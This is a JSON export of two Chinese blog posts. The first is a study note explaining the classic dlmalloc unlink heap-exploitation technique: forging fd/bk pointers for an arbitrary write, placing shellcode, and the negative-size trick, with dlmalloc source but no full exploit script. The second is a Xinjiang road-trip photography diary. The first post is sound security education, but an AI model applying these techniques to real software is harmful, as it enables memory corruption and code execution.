[{"content":"References ☞ usermode/library/malloc-original/src/dlmalloc.c\n☞ Once upon a free()\n☞ Vudo malloc tricks\n这个 trick 应该早就被修了，所以应该没有必要再浪费时间在这个上了吧\u0026hellip;\n这两篇文章也是 2001 年的东西\u0026hellip;\n但是真的很好奇具体的实现，所以还是浪费了很多时间去理这个\u0026hellip;\n起笔的时候并没有理清其实，但是就是因为信息量太大了所以才试着弄懂多少记下来多少\n毕竟本来这里也只是 Senri 的笔记本\n总之全部写完之后自己也懂了不少\u0026hellip;\n当然不敢说自己全懂，不然就和那些说自己「精通 C++」的人一样了x\n总之，这个 trick 的效果是「可以让你往任意地址上写一个值」（除非那段内存只读\nIntro GNU C 库所使用的 Memory Allocator 是 Doug Lea\u0026rsquo;s Malloc，简称为 dlmalloc，本文使用的是以下版本：\nThis is a version (aka dlmalloc) of malloc/free/realloc written by Doug Lea and released to the public domain. Use, modify, and redistribute this code without permission or acknowledgement in any way you wish. Send questions, comments, complaints, performance data, etc to dl@cs.oswego.edu\nVERSION 2.7.0 Sun Mar 11 14:14:06 2001 Doug Lea (dl at gee)\nStructure #define INTERNAL_SIZE_T size_t struct malloc_chunk { /* Size of previous chunk (if free). */ INTERNAL_SIZE_T prev_size; /* Size in bytes, including overhead. */ INTERNAL_SIZE_T size; /* double links -- used only if free. */ struct malloc_chunk* fd; struct malloc_chunk* bk; } 在 32 位的 x86 架构上，INTERNAL_SIZE_T 为 4 bytes；\nBefore free() 一个 Heap Chunk 即堆块，看起来是这样：\nName Description Pointer Size prev_size 仅当前一个 chunk 已被释放 (free) 时：保存前一个 chunk 的大小 ^chunk 4 bytes size 当前 chunk 的大小：这个大小指的是 chunk 到 nextchunk 之间的大小最后两比特用于标记特殊的状态信息 4 byte data 这里是数据\u0026hellip; ^mem prev_size 仅当前一个 chunk 已被释放 (free) 时：保存前一个 chunk 的大小从这里开始就是下一个 heap chunk 了 ^nextchunk 4 bytes 也就是说，当执行 a = malloc(n) 时，a 实际指向的位置在 mem 处；\nsize 处提到：最后两比特用于标记特殊的状态信息，他们是：\n#define PREV_INUSE 0x1 #define IS_MMAPPED 0x2 #define chunk_is_mmapped( p ) \\ ( (p)-\u0026gt;size \u0026amp; IS_MMAPPED ) #define prev_inuse( p ) \\ ( (p)-\u0026gt;size \u0026amp; PREV_INUSE ) 分别代表着：\n前一个 chunk 是否在使用中 是否通过 mmap 分配 例，若 size 为 0x29 即 00101101，那么它代表：\nchunk 实际大小：00101100 即 0x28 = 40 bytes mem 大小：40 bytes 减去 prev_size 和 size 都占用了的 4 bytes = 32 bytes 前一个块是否使用中？00101101 的最后一位为 1：确实在使用 当前块是通过 mmap 分配？00101101 的倒数第二位为 0：否。是通过 malloc() 分配的 After free() 当我们 free(mem) 释放一个 chunk 时，dlmalloc 会检查前一个 chunk 是否也被 free：使用的就是上面提到的 PREV_INUSE 标签\n如果是的话，dkmalloc 会试图合并这两个 chunk：其目的是尽量减少堆中「可重复利用块」的数量\n但是，如果前一个 chunk 正在使用中的话，dlmalloc 就无法做到去合并，这时候这个 chunk 会变成这样：\nName Description Pointer Size prev_size 仅当前一个 chunk 已被释放 (free) 时：保存前一个 chunk 的大小 ^chunk 4 bytes size 当前 chunk 的大小：这个大小指的是 chunk 到 nextchunk 之间的大小最后两比特用于标记特殊的状态信息 4 bytes fd 指向已 free 的 chunk 双链表中的下一个 chunk ^mem 4 bytes bk 指向已 free 的 chunk 双链表中的上一个 chunk 4 bytes 这里的数据不会被修改\u0026hellip; prev_size 因为前一个 chunk 已被释放：所以现在这里保存前一个 chunk 的大小从这里开始就是下一个 heap chunk 了 ^nextchunk 4 bytes 可以发现，mem 的位置现在多出来了两个值（或者说，是覆盖了原有的数据），分别都是 4 bytes，被称为 fd (forward) 和 bk (backward)\n只在这个 chunk 被 free 之后，mem 这两个地方才会用来保存指针，否则这两个指针不存在\n这两个指针指向保存着「可被重复利用的块」的一个环状双链表\n如果在 bk 后面还有很多数据的话，这些数据并不会被清零，除非下一次 malloc() 使用了这块地方\nFastbins Fastbin: An array of lists holding recently freed small chunks.\nFastbin 并不使用双链表的结构\nFastbin 的默认大小是 80 bytes:\n/* The maximum fastbin request size we support */ #define MAX_FAST_SIZE 80 如果使用了 fastbin，那么就不会使用双链表，而那个 trick 恰好是与双链表有关的\n所以，我们需要让 size \u0026gt; 80 才能触发 trick（无论本来 size 就大于 80，还是我们使用溢出的方式把 size 覆盖上了大于 80 的数值\nPrecondition: free() free() frees the memory space pointed to by ptr, which must have been returned by a previous call to malloc(), calloc() or realloc(). Otherwise, or if free(ptr) has already been called before, undefined behavior occurs. If ptr is NULL, no operation is per formed.\nfree() 的完整源码会放在文章最底下\nvoid fREe(Void_t* mem) { mstate av = get_malloc_state(); mchunkptr p; /* chunk corresponding to mem */ INTERNAL_SIZE_T size; /* its size */ mfastbinptr* fb; /* associated fastbin */ mchunkptr nextchunk; /* next contiguous chunk */ INTERNAL_SIZE_T nextsize; /* its size */ int nextinuse; /* true if nextchunk is used */ INTERNAL_SIZE_T prevsize; /* size of previous contiguous chunk */ mchunkptr bck; /* misc temp for linking */ mchunkptr fwd; /* misc temp for linking * ...... 当即将被 free 的 chunk 满足以下条件：\n不是 fastbin 不是通过 mmap 分配 则会执行以下判断\n先给出需要用的源码，再分别解释好了\n/* consolidate backward */ /* if #1 */ if (!prev_inuse(p)) { prevsize = p-\u0026gt;prev_size; size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); unlink(p, bck, fwd); } /* if #2 */ if (nextchunk != av-\u0026gt;top) { /* get and clear inuse bit */ nextinuse = inuse_bit_at_offset(nextchunk, nextsize); set_head(nextchunk, nextsize); /* consolidate forward */ if (!nextinuse) { unlink(nextchunk, bck, fwd); size += nextsize; } ...... First if if (!prev_inuse(p)) { prevsize = p-\u0026gt;prev_size; size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); unlink(p, bck, fwd); } 这里是第一次出现 unlink，也就是问题的根源\n这段代码很容易能看出来，它所做的事情就是，若前一个块不在使用中（判断依据是 size 的最后一个比特）时，把 chunk 向前合并\n这里出现了从来没见过的另一个东西：\n/* Treat space at ptr + offset as a chunk */ #define chunk_at_offset(p, s) ((mchunkptr)(((char*)(p)) + (s))) 其实也可以看出来，\np = chunk_at_offset(p, -((long) prevsize)) 相当于 p = p - prev_size\np = p - prev_size 的结果就是「上一个 chunk 的位置」，这里应该不难理解\n接下来，把「上一个 chunk」给 unlink(p, bck, fwd);\n关于 unlink() 会在下文详细说明\nSecond if if (nextchunk != av-\u0026gt;top) { /* get and clear inuse bit */ nextinuse = inuse_bit_at_offset(nextchunk, nextsize); set_head(nextchunk, nextsize); /* consolidate forward */ if (!nextinuse) { unlink(nextchunk, bck, fwd); size += nextsize; } ...... 以及其中出现的两个宏：\n/* check inuse bits in known places */ #define inuse_bit_at_offset(p, s)\\ (((mchunkptr)(((char*)(p)) + (s)))-\u0026gt;size \u0026amp; PREV_INUSE) /* Set size/use field */ #define set_head(p, s)\\ ((p)-\u0026gt;size = (s)) inuse_bit_at_offset(nextchunk, nextsize) 即：\n(nextchunk + nextsize)-\u0026gt; size \u0026amp; PREV_INUSE 即获得了 下个 chunk 的 再下个 chunk 的 PREV_INUSE 这个比特\n（即当前 chunk 的下一个临近 chunk 是否在被使用）\n最后保存到 nextinuse 中\nset_head(nextchunk, nextsize) 即：\n(nextchunk-\u0026gt;size = nextsize) 这句有点点意义不明，但是并不是很重要\n执行完上面两句后是另一个 if 判断：\n/* consolidate forward */ if (!nextinuse) { unlink(nextchunk, bck, fwd); size += nextsize; } 即当前面获得的 下个 chunk 的 再下个 chunk 的 PREV_INUSE 这个比特为假（即当前 chunk 的下一个临近 chunk 不在被使用）时：\nunlink(nextchunk, bck, fwd)，然后再把当前的 size 增加 nextsize\n结论是，在 free(aChunk) 时，想要让 unlink() 执行的话：\n必须满足的条件：\n不是 fastbin 不是通过 mmap 分配 接下来的条件满足一个就能执行 unlink():\naChunk 的 PREV_INUSE 被标记为否： =\u0026gt; 会对 aChunk 的 相邻上一个 chunk 执行 unlink()\naChunk 的 相邻下一个 chunk 并不是最后堆中的最后一个 且，aChunk 的 相邻下一个 chunk 的 再相邻下一个 chunk 的 PREV_INUSE 为否 (也就相当于 aChunk 的 相邻下一个 chunk 不在被使用) =\u0026gt; 会对 aChunk 的 相邻下一个 chunk 执行 unlink()\n在这一段文字里，相邻上/下一个 chunk 的计算方式是 chunk_at_offset(p, s)，也就是说\n相邻上一个 chunk = chunk_at_offset(p, -prev_size) 也就是 P 减去 prev_size\n相邻下一个 chunk = chunk_at_offset(p, size) 也就是 P 加上 size\n（别忘了，size 一直都指的是「包含 chunk metadata 的 chunk 大小」而不是 「chunk 中 mem 部分的大小」\nTricking unlink 接着终于来到了出问题的地方呢\u0026hellip;.\n/* Take a chunk off a bin list */ #define unlink(P, BK, FD) { [1] BK = P-\u0026gt;bk; \\ [2] FD = P-\u0026gt;fd; \\ [3] FD-\u0026gt;bk = BK; \\ [4] BK-\u0026gt;fd = FD; \\ } bk 和 fd 指针到 chunk 指针的偏移量，分别是 0xc 和 0x8\n即：\n[1] *BK = *(P+0xc) [2] *FD = *(P+0x8) 那么很容易就能发现问题了，同样的事情套到 [3], [4] 上，就会变成：\n[3] *(FD+0xc) = *BK [4] *(BK+0x8) = *FD ↓ [3] *(*(P+0x8) + 0xc) = *(P+0xc) [4] *(*(P+0xc) + 0x8) = *(P+0x8) ↓ [3] *fd + 0xc = *bk [4] *bk + 0x8 = *fd 其中，fd 和 bk 是可以被我们伪造的，而这就导致了：我们可以用 unlink() 往自己想要的地址上写值\n但有两个小问题是，1. 这个写是双向的；2. 这个写的操作会有一点点的偏移\n例如，我们让 fd 指向 动态链接表上某个函数的地址，让 bk 指向 堆上的某段 shellcode，那么：\naddr of func + 0xc = addr of shellcode addr of shllcode + 0x8 = = addr of funcs 可以看到，func + 0xc 的位置被写了 shellcode，偏移了整整 0xc\n以及，shellcode + 0x8 的位置也被写了 func 的地址，这绝对会导致 shellcode 到了这段时会无法正常执行\n所以解决方法分别是\n一开始就让想写入的地址减去 0xc 因为 shellcode + 0x8 的位置才会被覆盖，那么只要 让 shellcode 小于 8 bytes 就好 如果需要执行非常长的一段 shellcode，那么可以写 PUSH 真实地址 \u0026amp; RET，这个只需要 6 bytes 就能完成 所以稍微改写一下，我们就可以得到这个公式：\n令 fd = addr of func - 0xc 令 bk = addr of shllcode 那么 我们所想要的： fd + 0xc = addr of shllcode 我们必须得纳入考虑并避免的： bk + 0x8 = addr of func Trick: use negative size 前面提到，如果大小小于 80 的话会使用 fastbin，这样就没法使用这个 trick 了；\n所以我们必须得考虑到覆盖 size 的情况\n但如果输入方式（把数据写入 mem 的方式）不允许输入 NULL BYTE 的话，只能在这个 4 bytes 上写一个特别特别大的数值么？\n确实是这样的，可以写一个特别大，以至于是负数的值：例如 0xfffffffc\n那么比如当他加上 0x80 的时候，\n0xfffffffc + 0x80 = 0x10000007C = 0000,0000,0000,0001 0000,0000,0000,0000 0000,0000,0111,1100\n而这是一台 32 位的机器，第33位的那个 1 会被舍去，也就变成了： 0000,0000,0000,0000 0000,0000,0000,0000 0000,0000,0111,1100\n而这个值为 0x7c\n所以当 0x80 加上 0xfffffffc 时，实际的结果却相当于减去了 0x4，变成了 0x7c，相当于我们可以直接把它看作一个负数：-0x4\n同样的，0xfffffff8 也可以达到类似的效果，相当于 -0x8\n这两个负数还有额外的 buff：由于他们的最低两个比特都是 0，所以就可以混过 PREV_INUSE 和 IS_MMAPPED 的检查\n以及，当 malloc 计算临近的 chunk 时，使用的是 nextchunk = p + size；prevchunk = p - prev_size\n那么假设这两个值都是 0xfffffff8 就会：\nnextchunk = p + size = p + -8 = p - 8\nprevchunk = p - prev_size = p - -8 = p + 8\n变成以下的效果：\nnext chunk\u0026rsquo;s next\u0026rsquo;s PREV_INUSE 另外，还有一个需要提的：\nnextsize = chunksize(nextchunk); ...... nextchunk = chunk_at_offset(p, size); nextinuse = inuse_bit_at_offset(nextchunk, nextsize); 其中出现的宏 chunksize(p)：\n/* Get size, ignoring use bits */ #define chunksize(p) ((p)-\u0026gt;size \u0026amp; ~(SIZE_BITS)) 向后 unlink 的条件是 当前 chunk 的 相邻下一个 chunk 的 再相邻下一个 chunk 的 PREV_INUSE 为否\n如果我们是向后 unlink，而且把相邻后一个 chunk 的 size 写上了一个负数 0xfffffffc\n则 nextsize = ((nextchunk)-\u0026gt;size \u0026amp; ~(SIZE_BITS)) 也是这个负数 0xfffffffc\n那么 inuse_bit_at_offset(nextchunk, nextsize) 本来应该是 下下个 chunk 的 size\n/* check inuse bits in known places */ #define inuse_bit_at_offset(p, s)\\ (((mchunkptr)(((char*)(p)) + (s)))-\u0026gt;size \u0026amp; PREV_INUSE) 但现在却变成了\n((nextchunk + nextsize) -\u0026gt; size) \u0026amp; PREV_INUSE\n=\u0026gt; ((nextchunk + -0x4) -\u0026gt; size) \u0026amp; PREV_INUSE\n=\u0026gt; (nextchunk - 0x4 + 0x4) \u0026amp; PREV_INUSE\u0026hellip;.\n竟然就是 nextchunk \u0026amp; PREV_INUSE？！\n这样就根本不用覆写 nextchunk 的 nextchunk 的 PREV_INUSE 了，好神奇啊\u0026hellip;\nProof of Concept 本来想自己写例子的，但想想 Protostar 已经提供了那么好的题目那就用他们的吧x\nUnlink previous Protostar Heap Three Walkthrough\nUnlink next Protostar Final Two Walkthrough\nAppendix Source code of free() /* -------------------- free ---------------------- */ #if __STD_C void fREe(Void_t* mem) #else void fREe(mem) Void_t* mem; #endif { mstate av = get_malloc_state(); mchunkptr p; /* chunk corresponding to mem */ INTERNAL_SIZE_T size; /* its size */ mfastbinptr* fb; /* associated fastbin */ mchunkptr nextchunk; /* next contiguous chunk */ INTERNAL_SIZE_T nextsize; /* its size */ int nextinuse; /* true if nextchunk is used */ INTERNAL_SIZE_T prevsize; /* size of previous contiguous chunk */ mchunkptr bck; /* misc temp for linking */ mchunkptr fwd; /* misc temp for linking */ /* free(0) has no effect */ if (mem != 0) { p = mem2chunk(mem); size = chunksize(p); check_inuse_chunk(p); /* If eligible, place chunk on a fastbin so it can be found and used quickly in malloc. */ if ((unsigned long)(size) \u0026lt;= (unsigned long)(av-\u0026gt;max_fast) #if TRIM_FASTBINS /* If TRIM_FASTBINS set, don\u0026#39;t place chunks bordering top into fastbins */ \u0026amp;\u0026amp; (chunk_at_offset(p, size) != av-\u0026gt;top) #endif ) { set_fastchunks(av); fb = \u0026amp;(av-\u0026gt;fastbins[fastbin_index(size)]); p-\u0026gt;fd = *fb; *fb = p; } /* Consolidate other non-mmapped chunks as they arrive. */ else if (!chunk_is_mmapped(p)) { nextchunk = chunk_at_offset(p, size); nextsize = chunksize(nextchunk); /* consolidate backward */ if (!prev_inuse(p)) { prevsize = p-\u0026gt;prev_size; size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); unlink(p, bck, fwd); } if (nextchunk != av-\u0026gt;top) { /* get and clear inuse bit */ nextinuse = inuse_bit_at_offset(nextchunk, nextsize); set_head(nextchunk, nextsize); /* consolidate forward */ if (!nextinuse) { unlink(nextchunk, bck, fwd); size += nextsize; } /* Place the chunk in unsorted chunk list. Chunks are not placed into regular bins until after they have been given one chance to be used in malloc. */ bck = unsorted_chunks(av); fwd = bck-\u0026gt;fd; p-\u0026gt;bk = bck; p-\u0026gt;fd = fwd; bck-\u0026gt;fd = p; fwd-\u0026gt;bk = p; set_head(p, size | PREV_INUSE); set_foot(p, size); check_free_chunk(p); } /* If the chunk borders the current high end of memory, consolidate into top */ else { size += nextsize; set_head(p, size | PREV_INUSE); av-\u0026gt;top = p; check_chunk(p); } /* If freeing a large space, consolidate possibly-surrounding chunks. Then, if the total unused topmost memory exceeds trim threshold, ask malloc_trim to reduce top. Unless max_fast is 0, we don\u0026#39;t know if there are fastbins bordering top, so we cannot tell for sure whether threshold has been reached unless fastbins are consolidated. But we don\u0026#39;t want to consolidate on each free. As a compromise, consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD is reached. */ if ((unsigned long)(size) \u0026gt;= FASTBIN_CONSOLIDATION_THRESHOLD) { if (have_fastchunks(av)) malloc_consolidate(av); #ifndef MORECORE_CANNOT_TRIM if ((unsigned long)(chunksize(av-\u0026gt;top)) \u0026gt;= (unsigned long)(av-\u0026gt;trim_threshold)) sYSTRIm(av-\u0026gt;top_pad, av); #endif } } /* If the chunk was allocated via mmap, release via munmap() Note that if HAVE_MMAP is false but chunk_is_mmapped is true, then user must have overwritten memory. There\u0026#39;s nothing we can do to catch this error unless DEBUG is set, in which case check_inuse_chunk (above) will have triggered error. */ else { #if HAVE_MMAP int ret; INTERNAL_SIZE_T offset = p-\u0026gt;prev_size; av-\u0026gt;n_mmaps--; av-\u0026gt;mmapped_mem -= (size + offset); ret = munmap((char*)p - offset, size + offset); /* munmap returns non-zero on failure */ assert(ret == 0); #endif } } } negative_size.png (using draw.io) ","date":"2022-04-24T00:00:00Z","image":"/p/old_dlmalloc_unlink_tricks/cover_hu507ad38ef06aa99c1060308c140897fe_358203_120x120_fill_box_smart1_3.png","permalink":"/p/old_dlmalloc_unlink_tricks/","title":"Old Dlmalloc Unlink Tricks -REMASTERED-"},{"content":"准备 也就在几天前，和我爸一起完成了新疆的自驾，总计 26 天，13585 km。\n其实很久之前也有这么一次，但是并没有什么印象了。时间过去太久了算个原因，但主要是那时候确实只是逛逛就逛逛，然后就没有了。\n但这次不一样，因为趁着 618 买了 Tamron 18-300mm F3.5-F6.3，所以这整个旅行都是在试镜！其实硬要说的话就是为了这次旅行才买了这支镜头，因为看到一些说法是新疆地区，想拍风景可能甚至需要 200mm 以上的焦距，而富士 APSC 系统排第二的大变焦头是 18135，排第一的就只有 18300 了。\n至于为什么大变焦头呢，当然是因为懒得换镜头啦x\n机身是 X-T2，再带上了一只 XF23F2（等效视角 35mm），就这么一机两镜。\n行け！\n西安 第一天就直接开车到了西安，于是第二天就顺便去看了下兵马俑，以及人是真多。（还看到了一些白人，其中有个老先生竟然拿着 Olympus E-M1 Mark III）\n富士在 Exif 里写的焦距都是等效 135 之后的，所以这个就是 206mm 的视角。长焦确实是有用，因为场地很大，兵马俑离游客还是超级远的。手机 28mm 并没法像想象中那样拍出兵马俑一大堆的震撼感，反而是长焦加入了更多细节之后才会？\n西安还逛了一下古城墙。然而古城墙上太过宽敞，咋一拍还以为是什么宽敞马路\u0026hellip;\n钟楼。这时候就发现大变焦头的坏处了，稍微拉长一点焦距，光圈很快就掉到了 f6.3。X-T2 又没有机身防抖，所以为了稳定出片我快门的下限就是 1/56s。此时 ISO6400，细节已经确实不太能看了。\n顺带一提，下面这片人，全是收费拍照的，几乎把能占的好位置全先抢掉了，不付钱的话也不是很想挤进去挡别人镜头所以只好在外面拍\u0026hellip;以及，甚至有专门用「富士 X-T5」「富士拍立得」来吸引人的，难评x\n青海 经过了青藏高原的北部。这个地方是真干燥啊\u0026hellip;每天鼻子里都是块块，是干燥导致的出血之后又干燥结成的血块\u0026hellip;\n位于青海湖断崖，运气特别好拍下了这一张。其实人是有点多的，但是正好逮住一个机会海边只有一直牦牛。然后 AF 失效半天都在 MF（没办法，富士）的时候正好走进来一个女生！还正好红裙子啊啊！\n胶片模拟（简称滤镜）是 Classic Chrome，感觉这个滤镜对蓝色+白色的场景特别好看。除了色彩 +1 以外没有别的调整。\n茶卡盐湖的两张。反射度确实很高呢，但是网红化好严重啊，人也很多\u0026hellip;小火车拉着一批批人排队一个点打完卡去下个点。很多人会穿着胶鞋站在水里拍，会挺好看吧可能。但是我不喜欢人多的地方，于是稍微有点掉 san。\nU形公路，其实就是公路。因为角度很离谱于是成了景点？很多人都停车到旁边去拍，当然也有站在路中间不怕死的网红。但我走后没多久似乎是出了连环追尾还是侧翻的事故，反正多半是因为站在路上的人吧\u0026hellip;现在路两旁好像已经装上难看的绿色硬隔离了。\n这张的焦距都 350mm了。到了这种程度的压缩感才比较有感觉，更喜欢超长焦了。另外滤镜也是 CC。\n无人机拍下的，东台吉乃尔湖。免费景区，就在国道的路边。没有怎么调色，肉眼就能看到的蓝绿好像是因为是卤水\u0026hellip;这么看来颜色和水质都挺毒的。\n水上雅丹公园的鸟类，似乎就是海鸥。拍的时候正好有人在扔食物于是后面一群全起来了。不过有点可惜的是因为前面还在拍景，是 A 档 F10，所以自动出来的快门速度是 1/1300s，于是翅膀稍微有一点点糊。（实际上完全没有使用 P 档的经验，因为在此之前没怎么打过鸟）\n其它就和大部分雅丹景区差不多了。另外也是很大必须得坐摆渡车的类型。\n另外还去了翡翠湖和茫崖翡翠湖，但是都是地面上拍不出什么东西。\n艾肯泉。本来还都是草原的突然就冒出来这么个东西，颜色还很奇怪？然而也是在地面上什么都拍不出来。不过关于来历\u0026hellip;我爸的同学说是原来青海石油局在这边钻井，结果出水了，就扔那了。结果过了很久被围起来当场了景点\u0026hellip;怪不得附近很多磕头机\u0026hellip;\n南疆 和田 于是就这么进了南疆，第一站是和田。\n咕咕歪头~\n和田民族风情街，实际上是在原来的基础上重新改造的。店铺以首饰店居多，没太多卖食物的店，很奇怪。有些道并没有商业化（或者商业化失败店关掉了）所以还是在住人，生活气息稍微有些。\n但是咕咕，呜呜\u0026hellip;离咕咕亭就几百米的地方就有一面墙写上了当地的好吃的，在上面看到了「鸽子汤」「烤鸽子」\u0026hellip;\n晚饭是在和田玉交易市场附近吃的。和田玉似乎前几年很火，但现在去看交易市场并没有什么人，好冷清。\n喀什 然后到了喀什，见到了真正的老街（商业街还差不多）。果然和田的是低配版。\n小镜头小机身的好处呢w 平时直接抱在手上镜头一直对着前面也不是很显眼。光圈设置 F8 就算是富士也对得上焦。完全不用担心在店门口拍照会吸引店主出来「需要什么么」x\n全部用的都是 CC 滤镜，但是直出发现天空都有点过曝，暗部也有点死，所以高光 -1 阴影 +1 稍微正常了一些。顺带一提 CC 对这些黄色的建筑的颜色也是挺好看的。\n还去了一下高台民居，大概算是真正的老街。里面主要是手艺人开的店（真的么），建筑风格看起来就老旧很多了，不是很好拍：\n虽然两个都算是旅游景点但其实食物并不太贵，像一个烤包子就是三块钱的价格。但是因为太热所以没胃口。代价是晚上一回到酒店感觉自己低血糖了，特别累还头晕完全不想动。被外卖救了一命。说到外卖，这里的外卖似乎并不是美团而是第三方配送，但速度还行。\n塔什库尔干 第二天前往塔什库尔干县。国道 200km，而且不少大车，所以一直在借道超车（但还是会害怕）。\n路上经过了白沙湖，但已经见过了青海湖所以就觉得一般了呢。旁边的慕士塔格峰还不错，试着对其使用延时摄影。\n回到家一看才发现，脚架似乎不是很稳，有几帧被风吹歪了，影响观感很严重\u0026hellip;不过倒是吃到了以前拍延时的教训，那就是一定得 M 档并且 MF 不然就算天空变暗了可能相机测光也会给它弄亮导致看不出亮暗变化，要不就是某一帧突然对焦抽风糊掉了（屑屑富士）。\n以及这个时候开始，发现 18300 进灰了\u0026hellip;在 F10 下就很明显有点点了呜呜，所以后来的所有照片都是 F8 了\u0026hellip;\n耗牛肉抓饭！！并不是什么好看的照片，只是我很喜欢抓饭但以前吃到的都是羊肉的，这次是第一次吃耗牛肉。似乎只在塔什库尔干见到。总之萝卜很好吃，米饭很入味，而且牦牛肉完全不硬，特别细嫩。大概是卤过的所以味道也很好。现在看到这张也还是很想吃\u0026hellip;\n瓦罕走廊附近的，不知道名字但反正肯定是昆仑山脉的山峰。瓦罕走廊其实并没有什么好拍的，也就是塔什库尔干县常见的远处雪山+近处草原。但是一回头竟然看到了形状很不错的雪山！感觉确实是整段旅行里拍到的最好看的山峰，虽然现在再看感觉自己后期调色的时候把橙色有点搞多了。\n此外还去了红其拉甫国门，但当天没开于是折返。此处的最高海拔都 4464m 了，这辆 2.0T 的 SUV 似乎油门不是很带劲。不过还算好的，因为前面那辆车都在排黑烟了x\n下来之后顺便走了一下盘龙古道，使用 iPhone 的全景模式拍的。似乎在国道还是县道没修好之前去塔县的某个村子只能走这条路。为了安全已经变成了单行道。弯弯曲曲很多，开快车的也很多，会跟你特别紧，压力怪草。\n但是不得不说的是，从村子出来往国道走的那条路，他妈的全是减速带，还他妈的全是新疆检查站同款的那种减速带，5km/h 的速度碾过去都会被狠狠颠到。车厢里东西颠得到处都是。多亏了这些减速带，后来的一天直到晚上都头疼脖子疼\u0026hellip;\n帕米尔景区，主要内容物是一个废弃石头城，一个石头城博物馆（讲了下玄奘的事情，才知道他回程走了五万里，还上了 4900m 的高山，肃然起敬x），以及草地。我去主要还是为了草地，因为雪山脚下的小镇什么的看起来很不错ww\n当晚云似乎散开了，于是小睡了一会，一点起床然后——\n星空！！出乎意料的是并不需要多么高的 ISO，曝光 15s 的话只需要 1000 就够了。当然后来 100% 放大才发现有些星星已经出了轨迹了，以后如果有机会的话，等效 35mm 还是少曝一会，10s 可能差不多？\n还架了 6D，但是超广角是 F4 小三元。换成 2470F2.8 又发现个问题：虽然 X-T2 的实时取景也是一片黑，但是我可以曝光完了直接翻转屏看角度好不好，不好了直接调整脚架继续曝；但 6D 根本没有翻转屏！因为风大所以脚架架得低，取景器也看不到\u0026hellip;完全不知道都拍了些几把\u0026hellip;所以到最后主力还是 X-T2。\n另外就是，右下角有个电线杆子，但是真的已经开车跑了很远了，才到了这个相对空旷又没有光污染的地方。结果还又冷又困，于是就在这拍了，于是有电线杆\u0026hellip;算是小遗憾吧。如果以后还有机会的话，绝对要下午就睡觉，这样一晚上跑多远拍多久也不疲x\n第二天睡了挺久，然后翻大众点评才发现，原来叫做「慕士塔格峰冰川公园」的地方，在夏季也是有冰川可以看的！而且甚至路上可能会遇到土拨鼠。后来虽然确实是看到了土拨鼠，但因为摆渡车有窗户而且特别抖，所以完全没可能使用超长焦。\n摆渡车只送到一个大平台，再往上想摸到冰川还得骑马或者走楼梯 500m。此时海拔大概也是 4000m 多，竟然有牛牛？\n但是我焦距都拉到 300mm（等效 450mm）了牛牛竟然还发现了然后盯着我，害怕x\n后来山脚下看到的并不比山上差。在山上的话放无人机倒是很合适但是那几个视频素材并不好上传。另外这个两张照片正好差不多 EV 15，对肉眼来说是不戴墨镜几乎睁不开眼睛的程度，大概能做个参考。\n正好最近想入 M43 + 大光圈手动头。但是 M43 低端机快门最快也只给到 1/4000s，甚至有些没给电子快门。那么算一下，在 EV 15 如果 ISO 200，1/4000s，那么光圈最大也只能是 F4\u0026hellip;上海夏季最近的阳光也不比这个差太多，这么看来想大光圈的话不上 ND 就没法用了。\n库车 在市内并没有怎么停留，就看了一下王府。\n有个礼拜堂，但已经空了。王府里除了博物馆，还有表演的地方，以及看到了真正的库车末代女王？就坐在那边刷手机，似乎几十块钱就可以合影留念。\n另外发生一件神奇的事情，在用 18300 快速变焦到小焦距然后半按快门的时候，竟然对焦到了镜头里的灰尘？首先不可能是后镜组的，其次也确认了不是 UV 或者前镜片上的，那就只能是镜头里的咯？神奇。\n第二天一早就起床去独库公路！\n天山大峡谷。但是天气一直不怎么好，直到走得时候才放晴\u0026hellip;于是虽然前面有很多构图不错的但全都天空发白或者石头没啥颜色。颜色不错的例子只有这张了。第一次感受到天气是多么重要，因为之前运气很好几乎就没有不好的天气。\n小龙池，感觉就还好吧。往后一点大龙池听说不错？但实际上过去了发现就是小龙池的放大版本草x\n但是再往后的路上竟然见到了——\n最满意的照片之一。后面那个很平的湖就是大龙池，看起来小但实际上面积有五六个小龙池大了。从库车-\u0026gt;独山子的方向看大龙池并没有什么特别的，雪山也看不太到。但是走过去之后碰巧一回头发现这个草原和龙池和后面的雪山在一起太配了\u0026hellip;而且运气好好正好刷出几匹马！于是是这趟里面最满意的照片之一w\n还有一个趣事是后来停车买了个瓜吃，旁边散养的牛牛就一直看着我。难道是想吃瓜皮么？于是扔给它，然后它几口就吃完了开始等下一片ww\n巴音布鲁克/唐布拉百里画廊 很久以前来过巴音布鲁克，那时候景区虽然也收费但至少可以开车。但现在似乎因为某部电影的影响，景区爆火了。于是就被拿去捞钱了。首先是景区门口故意放得很远，说是可以自己走进去但谁做得到呢。然后区间车收费。然后区间车还不到九曲十八弯这个景点，再过去坐车又要花钱。\n而且天鹅湖没有天鹅只有漂浮着的碎馕屑。里面工作人员好像态度也很差。于是不打算去了。这些我没有经历过，我是看大众点评知道的。但是仅此我就确实不想去了，讨厌人多的地方。\n不过从巴音布鲁克出来前往唐布拉百里画廊的独库公路一段倒是挺不错的。但是真冷啊\u0026hellip;就不到十度，一边拍照一边冻得哆嗦。\n后面还下起雨了。然后\u0026hellip;\n平平无奇的一张照片。但是这个浅浅的草地，这个山坡，土地颜色，以及小溪流，给人一种死亡搁浅的感觉？如果没有那几匹马的话就更像了。\n唐布拉，主要就是草原，但是也有很多很高耸的树和山。如果是晴天的话应该很不错。但很可惜还在阴天，于是颜色都不是很好看，只能找点形状好看的云了。再次感受到天气多么重要，要是晴天就好了\u0026hellip;\n这个时候拍得有点害怕，因为在小雨。而只要抽拉一下镜头，镜桶上面的水滴和灰尘就不见了。去哪了呢。\n伊犁地区 架子肉，第一次吃。不过和想象中的烤肉差不太多，第一口超级满足，越往后越腻甚至需要饮料送服。\n很火的一个景点是那拉提草原，但是我不喜欢人多的地方，于是前往小众一点的库尔德宁。\n什么鬼啊！虽然我确实想要晴天但是一点云都没有！好单调！\n于是感觉风光佬真不容易，阴天不好出片，就算是晴天如果万里无云也不好出片\u0026hellip;\n总之库尔德宁也算是个十里画廊吧，但有不少可以通往原始森林的木栈道，走走还是挺不错的。\n看到了小奶猫，想拍，但是猫猫一直乱动。旁边的大爷看见了，就一把把猫猫抱了起来，于是留下了这张w\n想停留昭苏看看油菜花，但似乎是早了呢。所以直接走伊昭公路前往伊宁市了。p.s. 